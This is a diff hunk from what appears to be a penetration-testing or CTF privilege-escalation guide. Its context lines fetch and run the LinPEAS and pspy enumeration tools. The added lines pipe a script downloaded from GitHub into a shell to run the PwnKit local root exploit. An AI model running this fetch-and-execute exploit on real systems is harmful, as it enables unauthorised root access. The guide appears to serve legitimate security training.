@@ -100,6 +100,9 @@ chmod +x linpeas.sh && ./linpeas.sh  # Run LinPEAS
 
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
 chmod +x pspy64 && ./pspy64  # Run pspy to monitor processes
+
+#if vulnerable to Pwnkit
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
 
 ### 10. Practical Exploitation
